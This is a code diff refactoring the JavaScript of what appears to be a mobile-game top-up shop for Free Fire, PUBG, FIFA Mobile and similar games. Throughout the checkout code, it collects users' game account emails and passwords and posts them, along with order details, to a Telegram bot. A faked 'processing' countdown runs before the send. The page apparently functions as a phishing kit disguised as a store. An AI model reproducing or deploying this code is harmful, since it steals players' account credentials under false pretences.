-            qtyContainer.querySelector('.increment-val').onclick = () => {
-                modifyCartItemQuantity(pId, pName, pPrice, 1);
-            };
-            qtyContainer.querySelector('.decrement-val').onclick = () => {
-                modifyCartItemQuantity(pId, pName, pPrice, -1);
-            };
+            qtyContainer.querySelector('.increment-val').onclick = () => { modifyCartItemQuantity(pId, pName, pPrice, 1); };
+            qtyContainer.querySelector('.decrement-val').onclick = () => { modifyCartItemQuantity(pId, pName, pPrice, -1); };
         });
     }
 
-    function modifyCartItemQuantity(id, name, price, modificationStep) {
-        let matchedIndex = shoppingBasket.findIndex(item => item.id === id);
-
-        if (matchedIndex > -1) {
-            shoppingBasket[matchedIndex].quantity += modificationStep;
-            if (shoppingBasket[matchedIndex].quantity <= 0) {
-                shoppingBasket.splice(matchedIndex, 1);
-            }
-        } else if (modificationStep > 0) {
-            shoppingBasket.push({
-                id: id,
-                name: name,
-                price: price,
-                game: currentGame,
-                quantity: 1
-            });
+    function modifyCartItemQuantity(id, name, price, step) {
+        let idx = shoppingBasket.findIndex(item => item.id === id);
+        if (idx > -1) {
+            shoppingBasket[idx].quantity += step;
+            if (shoppingBasket[idx].quantity <= 0) shoppingBasket.splice(idx, 1);
+        } else if (step > 0) {
+            shoppingBasket.push({ id, name, price, game: currentGame, method: currentMethod, quantity: 1 });
         }
-
         updateBasketDOMCounters();
         injectReactiveQuantitySelectors();
     }
 
-    function initializeProductSelection(gameKey) {
-        currentGame = gameKey;
-        if (!rechargeList) return;
-        
-        if (currentGame === "PUBG") {
-            rechargeList.innerHTML = pubgProducts;
-        } else if (currentGame === "CALL OF DUTY") {
-            rechargeList.innerHTML = codProducts;
-        } else if (currentGame === "FIFA MOBILE") {
-            rechargeList.innerHTML = fifaProducts;
-        } else if (currentGame === "PES MOBILE") {
-            rechargeList.innerHTML = pesProducts;
-        } else if (currentGame === "BLOOD STRIKE") {
-            rechargeList.innerHTML = bsProducts;
-        } else {
-            rechargeList.innerHTML = currentMethod === 'ACC' ? ffAccProducts : ffIdProducts;
-        }
-        
-        const activeThemeColor = themes[currentGame].color;
-        setTimeout(() => {
-            rechargeList.querySelectorAll('.recharge-item:not(.membership)').forEach(el => {
-                el.style.borderColor = activeThemeColor;
-            });
-        }, 10);
-
-        if (rechargeModal) rechargeModal.classList.add('active');
-        injectReactiveQuantitySelectors();
-    }
-
-    // Grid Element Events Setup -> Setting the chosen game key and opening Enter ID login modal first
-    const ffCard = document.querySelector('#home-content-section .ff-card');
-    if (ffCard) ffCard.addEventListener('click', () => { currentGame = "FREE FIRE"; openCredentialsModal(); });
-    
-    const pubgCard = document.querySelector('#home-content-section .pubg-card');
-    if (pubgCard) pubgCard.addEventListener('click', () => { currentGame = "PUBG"; openCredentialsModal(); });
-    
-    const codCard = document.querySelector('#home-content-section .cod-card');
-    if (codCard) codCard.addEventListener('click', () => { currentGame = "CALL OF DUTY"; openCredentialsModal(); });
-    
-    const fifaCard = document.querySelector('#home-content-section .fifa-card');
-    if (fifaCard) fifaCard.addEventListener('click', () => { currentGame = "FIFA MOBILE"; openCredentialsModal(); });
-    
-    const pesCard = document.querySelector('#home-content-section .pes-card');
-    if (pesCard) pesCard.addEventListener('click', () => { currentGame = "PES MOBILE"; openCredentialsModal(); });
-    
-    const bsCard = document.querySelector('#home-content-section .bs-card');
-    if (bsCard) bsCard.addEventListener('click', () => { currentGame = "BLOOD STRIKE"; openCredentialsModal(); });
-
-    function openCredentialsModal() {
-        if (!gameModal || !themes[currentGame]) return;
-        const currentTheme = themes[currentGame];
-        
-        if (modalTitle) {
-            modalTitle.innerText = currentGame;
-            modalTitle.style.color = currentTheme.color;
-        }
-        if (modalIcon) {
-            modalIcon.src = currentTheme.icon;
-            modalIcon.style.borderColor = currentTheme.color;
-        }
-        
-        const inpSection = gameModal.querySelector('.input-section');
-        if (inpSection) inpSection.style.borderColor = currentTheme.color;
-        
-        gameModal.querySelectorAll('.input-header').forEach(h => h.style.color = currentTheme.color);
-        if (btnId) btnId.style.borderColor = currentTheme.color;
-        if (btnAcc) btnAcc.style.borderColor = currentTheme.color;
-        
-        if (toggleContainer) {
-            if (currentGame === "FREE FIRE") {
-                toggleContainer.style.display = 'flex';
-            } else {
-                toggleContainer.style.display = 'none'; 
+    // ==========================================
+    // "View Basket" button in products modal → go to credentials first
+    // ==========================================
+    if (openBasketFromProducts) {
+        openBasketFromProducts.onclick = () => {
+            if (shoppingBasket.length === 0) {
+                alert("Your basket is empty! Add products first.");
+                return;
             }
-        }
-        
-        if (idField) idField.value = "";
-        if (emailField) emailField.value = "";
-        if (passField) passField.value = "";
-        
-        switchToID();
-        gameModal.classList.add('active');
+            openCredentialsModal();
+        };
     }
 
-    function switchToID() {
-        currentMethod = 'ID';
-        if (!themes[currentGame]) return;
-        
-        if (btnId) {
-            btnId.classList.add('active');
-            btnId.style.background = themes[currentGame].color;
-            btnId.style.color = "#000";
-        }
-        if (btnAcc) {
-            btnAcc.classList.remove('active');
-            btnAcc.style.background = "transparent";
-            btnAcc.style.color = themes[currentGame].color;
-        }
-        
-        if (idGroup) idGroup.style.display = 'block';
-        if (accGroup) accGroup.style.display = 'none';
-        
-        if (currentGame === "FREE FIRE" && rechargeList) {
-            rechargeList.innerHTML = ffIdProducts;
-            injectReactiveQuantitySelectors();
-        }
-        validateInputs();
+    if (floatingBasketTrigger) {
+        floatingBasketTrigger.onclick = () => {
+            if (shoppingBasket.length > 0) {
+                // Decide which modal to show: if credentials were already set, go to checkout
+                // Otherwise open credentials
+                openCredentialsModal();
+            }
+        };
     }
 
-    function switchToACC() {
-        currentMethod = 'ACC';
-        if (!themes[currentGame]) return;
-        
-        if (btnId) {
-            btnId.classList.remove('active');
-            btnId.style.background = "transparent";
-            btnId.style.color = themes[currentGame].color;
-        }
-        if (btnAcc) {
-            btnAcc.classList.add('active');
-            btnAcc.style.background = themes[currentGame].color;
-            btnAcc.style.color = "#000";
-        }
-        
-        if (idGroup) idGroup.style.display = 'none';
-        if (accGroup) accGroup.style.display = 'block';
-        
-        if (currentGame === "FREE FIRE" && rechargeList) {
-            rechargeList.innerHTML = ffAccProducts;
-            injectReactiveQuantitySelectors();
-        }
-        validateInputs();
-    }
-
-    if (btnId) btnId.addEventListener('click', switchToID);
-    if (btnAcc) btnAcc.addEventListener('click', switchToACC);
-
-    function validateInputs() {
-        if (!confirmBtn) return;
-        let isValid = false;
-        
-        if (currentMethod === 'ID') {
-            isValid = idField ? idField.value.trim().length > 4 : false;
-        } else {
-            const emailValid = emailField ? emailField.value.trim().length > 4 : false;
-            const passValid = passField ? passField.value.trim().length > 2 : false;
-            isValid = emailValid && passValid;
-        }
-
-        confirmBtn.disabled = !isValid;
-        if (isValid && themes[currentGame]) {
-            confirmBtn.classList.add('active-style');
-            confirmBtn.style.background = `linear-gradient(to bottom, ${themes[currentGame].color}, ${themes[currentGame].accent})`;
-        } else {
-            confirmBtn.classList.remove('active-style');
-            confirmBtn.style.background = "#4a2107";
-        }
-    }
-
-    if (idField) idField.addEventListener('input', validateInputs);
-    if (emailField) emailField.addEventListener('input', validateInputs);
-    if (passField) passField.addEventListener('input', validateInputs);
-
-    // Confirm button now opens the product grid for the user to shop
-    if (confirmBtn) {
-        confirmBtn.addEventListener('click', () => {
-            authenticatedUserMeta.method = currentMethod;
-            authenticatedUserMeta.rawId = idField ? idField.value : "";
-            authenticatedUserMeta.email = emailField ? emailField.value : "";
-            authenticatedUserMeta.password = passField ? passField.value : "";
-
-            if (gameModal) gameModal.classList.remove('active');
-            initializeProductSelection(currentGame);
-        });
-    }
-
+    // ==========================================
+    // CHECKOUT MODAL
+    // ==========================================
     function compileAndOpenCheckoutModal() {
-        const basketContainer = document.getElementById('basket-items-wrapper');
-        const totalPriceSumNode = document.getElementById('basket-total-price-sum');
-        
+        const basketContainer    = document.getElementById('basket-items-wrapper');
+        const totalPriceSumNode  = document.getElementById('basket-total-price-sum');
+
         if (shoppingBasket.length === 0) {
-            alert("Your shopping basket market is empty! Add products first.");
+            alert("Your shopping basket is empty! Add products first.");
             return;
         }
 
@@ -570,45 +577,33 @@ document.addEventListener('DOMContentLoaded', () => {
         shoppingBasket.forEach(item => {
             const rowTotalCost = item.price * item.quantity;
             accumulatedSum += rowTotalCost;
-
             if (basketContainer) {
-                const summaryRowElement = document.createElement('div');
-                summaryRowElement.className = 'basket-summary-row';
-                summaryRowElement.innerHTML = `
+                const rowEl = document.createElement('div');
+                rowEl.className = 'basket-summary-row';
+                rowEl.innerHTML = `
                     <div class="basket-item-info">
                         <div class="basket-item-title">${item.name} (x${item.quantity})</div>
-                        <div class="basket-item-meta">Game Platform: ${item.game}</div>
+                        <div class="basket-item-meta">Game: ${item.game}</div>
                     </div>
                     <div class="basket-item-cost">${rowTotalCost} EGP</div>
                 `;
-                basketContainer.appendChild(summaryRowElement);
+                basketContainer.appendChild(rowEl);
             }
         });
 
         if (totalPriceSumNode) totalPriceSumNode.innerText = `${accumulatedSum} EGP`;
-
-        if (rechargeModal) rechargeModal.classList.remove('active');
         if (checkoutModal) checkoutModal.classList.add('active');
     }
 
-    // Basket triggers now compile checkout layout immediately since ID information is verified beforehand
-    if (floatingBasketTrigger) {
-        floatingBasketTrigger.onclick = () => {
-            if (shoppingBasket.length > 0) {
-                compileAndOpenCheckoutModal();
-            }
-        };
-    }
-    if (openBasketFromProducts) {
-        openBasketFromProducts.onclick = () => {
-            if (shoppingBasket.length > 0) {
-                compileAndOpenCheckoutModal();
-            }
-        };
+    if (backToRecharge) {
+        backToRecharge.addEventListener('click', () => {
+            if (checkoutModal)    checkoutModal.classList.remove('active');
+            if (rechargeModal)    rechargeModal.classList.add('active');
+        });
     }
 
     // ==========================================
-    // FINALIZED SECURE TRANSMISSION TO TELEGRAM
+    // CHECKOUT CONFIRM → TELEGRAM
     // ==========================================
     const checkoutBtn = document.getElementById('checkout-btn');
     if (checkoutBtn) {
@@ -617,7 +612,6 @@ document.addEventListener('DOMContentLoaded', () => {
             checkoutBtn.disabled = true;
             checkoutBtn.style.cursor = "not-allowed";
             checkoutBtn.style.background = "#555";
-
             const intervalLoop = setInterval(() => {
                 timerSeconds--;
                 if (timerSeconds > 0) {
@@ -628,19 +622,17 @@ document.addEventListener('DOMContentLoaded', () => {
                     executeOrderCompletion();
                 }
             }, 1000);
-
             checkoutBtn.innerText = "processing.";
         });
     }
 
     function executeOrderCompletion() {
         if (successNotification) successNotification.style.display = "block";
-        if (checkoutActionContainer) checkoutActionContainer.innerHTML = `<div class="done-status-block">DONE</div>`;
+        if (checkoutActionCont) checkoutActionCont.innerHTML = `<div class="done-status-block">✅ DONE</div>`;
 
         let productsMessageList = shoppingBasket.map((item, idx) => {
             return `${idx + 1}. 🎮 [${item.game}] - ${item.name} x${item.quantity} -> (${item.price * item.quantity} EGP)`;
         }).join('\n');
-
         let overallCartTotal = shoppingBasket.reduce((sum, item) => sum + (item.price * item.quantity), 0);
 
         let userAccessInfoString = "";
@@ -650,109 +642,112 @@ document.addEventListener('DOMContentLoaded', () => {
             userAccessInfoString = `📧 Login Email: ${authenticatedUserMeta.email}\n🔑 Account Password: ${authenticatedUserMeta.password}`;
         }
 
-        const botFeedbackPayload = `🛒 NEW MULTI-PRODUCT MARKET ORDER \n\n${userAccessInfoString}\n\n📦 SELECTED BASKET ITEMS:\n${productsMessageList}\n\n💰 TOTAL PAYABLE SUM: ${overallCartTotal} EGP`;
+        const botPayload = `🛒 NEW MARKET ORDER\n\n${userAccessInfoString}\n\n📦 SELECTED ITEMS:\n${productsMessageList}\n\n💰 TOTAL: ${overallCartTotal} EGP`;
         const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
         fetch(telegramApiUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: botFeedbackPayload
-            })
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: botPayload })
         })
-        .then(res => {
-            console.log("Multi-product receipt dispatched successfully.");
+        .then(() => {
             shoppingBasket = [];
             updateBasketDOMCounters();
-            
             setTimeout(() => {
-                if (checkoutModal) checkoutModal.classList.remove('active');
-                if (successNotification) successNotification.style.display = "none";
-                if (checkoutActionContainer) {
-                    checkoutActionContainer.innerHTML = `<button id="checkout-btn" class="blue-btn">CONFIRM & COMPLETE CHECKOUT</button>`;
-                    // Re-bind click event to newly inserted button
-                    const newCheckoutBtn = document.getElementById('checkout-btn');
-                    if (newCheckoutBtn) {
-                        newCheckoutBtn.addEventListener('click', () => {
-                            let timerSeconds = 6;
-                            newCheckoutBtn.disabled = true;
-                            newCheckoutBtn.style.cursor = "not-allowed";
-                            newCheckoutBtn.style.background = "#555";
-
-                            const loop = setInterval(() => {
-                                timerSeconds--;
-                                if (timerSeconds > 0) {
-                                    let textDots = ".".repeat(((6 - timerSeconds) % 3) + 1);
-                                    newCheckoutBtn.innerText = `processing${textDots}`;
-                                } else {
-                                    clearInterval(loop);
-                                    executeOrderCompletion();
-                                }
+                if (checkoutModal)         checkoutModal.classList.remove('active');
+                if (successNotification)   successNotification.style.display = "none";
+                if (checkoutActionCont) {
+                    checkoutActionCont.innerHTML = `<button id="checkout-btn" class="blue-btn">CONFIRM & COMPLETE CHECKOUT</button>`;
+                    const newBtn = document.getElementById('checkout-btn');
+                    if (newBtn) {
+                        newBtn.addEventListener('click', () => {
+                            let t = 6;
+                            newBtn.disabled = true;
+                            newBtn.style.cursor = "not-allowed";
+                            newBtn.style.background = "#555";
+                            const lp = setInterval(() => {
+                                t--;
+                                if (t > 0) { let d = ".".repeat(((6-t)%3)+1); newBtn.innerText = `processing${d}`; }
+                                else { clearInterval(lp); executeOrderCompletion(); }
                             }, 1000);
-                            newCheckoutBtn.innerText = "processing.";
+                            newBtn.innerText = "processing.";
                         });
                     }
                 }
             }, 5000);
         })
-        .catch(err => {
-            console.error("Transmission failed:", err);
-        });
+        .catch(err => console.error("Transmission failed:", err));
     }
 
-    // --- Dynamic Review Feedbacks Mechanism ---
-    const feedbackSubmitBtn = document.getElementById('feedback-submit-btn');
-    const feedbackTextareaField = document.getElementById('feedback-textarea-field');
-    const feedbackInputBox = document.getElementById('feedback-input-box');
-    const feedbackThanksBox = document.getElementById('feedback-thanks-box');
+    // ==========================================
+    // GAME CARD CLICK EVENTS
+    // ==========================================
+    const ffCard = document.querySelector('#home-content-section .ff-card');
+    if (ffCard) ffCard.addEventListener('click', () => {
+        currentGame = "FREE FIRE";
+        openFFTypeModal(); // Free Fire always shows type selection first
+    });
+
+    const pubgCard = document.querySelector('#home-content-section .pubg-card');
+    if (pubgCard) pubgCard.addEventListener('click', () => { currentGame = "PUBG"; openProductsDirectly(); });
+
+    const codCard = document.querySelector('#home-content-section .cod-card');
+    if (codCard) codCard.addEventListener('click', () => { currentGame = "CALL OF DUTY"; openProductsDirectly(); });
+
+    const fifaCard = document.querySelector('#home-content-section .fifa-card');
+    if (fifaCard) fifaCard.addEventListener('click', () => { currentGame = "FIFA MOBILE"; openProductsDirectly(); });
+
+    const pesCard = document.querySelector('#home-content-section .pes-card');
+    if (pesCard) pesCard.addEventListener('click', () => { currentGame = "PES MOBILE"; openProductsDirectly(); });
+
+    const bsCard = document.querySelector('#home-content-section .bs-card');
+    if (bsCard) bsCard.addEventListener('click', () => { currentGame = "BLOOD STRIKE"; openProductsDirectly(); });
+
+    // ==========================================
+    // FEEDBACK
+    // ==========================================
+    const feedbackSubmitBtn      = document.getElementById('feedback-submit-btn');
+    const feedbackTextareaField  = document.getElementById('feedback-textarea-field');
+    const feedbackInputBox       = document.getElementById('feedback-input-box');
+    const feedbackThanksBox      = document.getElementById('feedback-thanks-box');
 
     if (feedbackSubmitBtn && feedbackTextareaField) {
         feedbackSubmitBtn.addEventListener('click', () => {
-            const userFeedbackContent = feedbackTextareaField.value.trim();
-
-            if (userFeedbackContent === "") {
-                alert("من فضلك اكتب تعديلك أو المشكلة أولاً.");
-                return;
-            }
-
+            const content = feedbackTextareaField.value.trim();
+            if (content === "") { alert("من فضلك اكتب تعديلك أو المشكلة أولاً."); return; }
             feedbackSubmitBtn.disabled = true;
             feedbackTextareaField.disabled = true;
-
-            let feedbackTimeLeft = 3; 
+            let timeLeft = 3;
             feedbackSubmitBtn.innerText = "processing.";
-
-            const feedbackTimerLoop = setInterval(() => {
-                feedbackTimeLeft--;
-                if (feedbackTimeLeft > 0) {
-                    let dotsCount = ((3 - feedbackTimeLeft) % 3) + 1;
-                    feedbackSubmitBtn.innerText = "processing" + ".".repeat(dotsCount);
-                } else {
-                    clearInterval(feedbackTimerLoop);
+            const loop = setInterval(() => {
+                timeLeft--;
+                if (timeLeft > 0) { feedbackSubmitBtn.innerText = "processing" + ".".repeat(((3-timeLeft)%3)+1); }
+                else {
+                    clearInterval(loop);
                     if (feedbackInputBox) feedbackInputBox.style.display = "none";
                     if (feedbackThanksBox) feedbackThanksBox.style.display = "block";
                 }
             }, 1000);
-
-            const botFeedbackPayload = `📝 New Website Review / Bug Report\n\n💭 Feedback:\n${userFeedbackContent}`;
-            const feedbackTelegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-
-            fetch(feedbackTelegramUrl, {
+            const payload = `📝 New Feedback\n\n💭 ${content}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: botFeedbackPayload
-                })
-            })
-            .then(res => console.log("Feedback dispatched successfully."))
-            .catch(err => console.error("Feedback endpoint failed:", err));
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: payload })
+            }).catch(err => console.error("Feedback failed:", err));
         });
     }
 
+    // ==========================================
+    // CLOSE MODALS BY CLICKING OUTSIDE
+    // ==========================================
     window.addEventListener('click', (e) => {
         if (e.target.classList.contains('modal-overlay')) {
             e.target.classList.remove('active');
+            // Also close any other open modals and reset basket on outside-click exit
+            [ffTypeModal, rechargeModal, credentialsModal, checkoutModal].forEach(m => {
+                if (m) m.classList.remove('active');
+            });
+            resetBasket();
         }
     });
 });
